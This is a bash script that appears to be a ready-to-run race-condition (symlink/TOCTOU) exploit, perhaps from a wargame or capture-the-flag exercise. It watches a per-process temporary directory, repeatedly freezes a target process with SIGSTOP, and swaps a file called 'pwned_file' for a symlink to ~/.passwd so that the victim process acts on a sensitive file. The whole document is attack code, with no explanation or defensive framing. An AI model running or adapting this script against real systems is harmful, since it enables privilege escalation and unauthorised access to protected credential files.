#!/bin/bash

DIRECTORY="/tmp/$PPID/$1"
echo "Checking in: $DIRECTORY"

while :; do
    if [ -d "$DIRECTORY" ]; then
        if [ "$(ls -A "$DIRECTORY")" ]; then
            DIR_PATTERN="tmp.*"
            FOUND_DIRS=$(find "$DIRECTORY" -type d -name "$DIR_PATTERN")

            if [ -n "$FOUND_DIRS" ]; then 
                kill -SIGSTOP $1
                echo -n "data" > $FOUND_DIRS/pwned_file
                kill -SIGCONT $1
                ln -sf ~/.passwd $FOUND_DIRS/pwned_file
                while : ; do
                    kill -SIGSTOP $1
                    unlink $FOUND_DIRS/pwned_file
                    echo -n "data" > $FOUND_DIRS/pwned_file
                    ln -sf ~/.passwd $FOUND_DIRS/pwned_file
                    kill -SIGCONT $1
                    [[ -e "$FOUND_DIRS" ]] || break
                done
                break
            else
                echo "No directories found matching pattern '$DIR_PATTERN' in $DIRECTORY."
            fi
        else
            echo "Directory $DIRECTORY exists but is empty."
        fi
    else
        echo "Directory $DIRECTORY does not exist."
    fi
done
